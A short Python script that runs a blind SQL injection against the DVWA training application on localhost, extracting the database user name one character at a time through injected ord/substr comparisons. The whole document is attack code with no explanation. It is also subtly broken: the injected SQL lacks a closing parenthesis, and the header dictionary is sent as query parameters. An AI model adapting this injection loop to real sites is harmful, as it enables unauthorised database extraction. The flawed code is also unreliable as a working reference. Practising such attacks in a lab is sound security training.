#!-*-encoding:utf-8 -*-

import requests

for i in range(1,15):
    for j in range(63,123):
        url = "http://localhost/dvwa-master/vulnerabilities/sqli_blind/?id=1' and ord(substr(user(),"+str(i)+",1)="+str(j)+" %23&Submit=Submit#"
        head = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"}
        get = requests.get(url,head,timeout=15)
        # print url
        if 'User ID exists in the database' in get.text:
            print(chr(j))
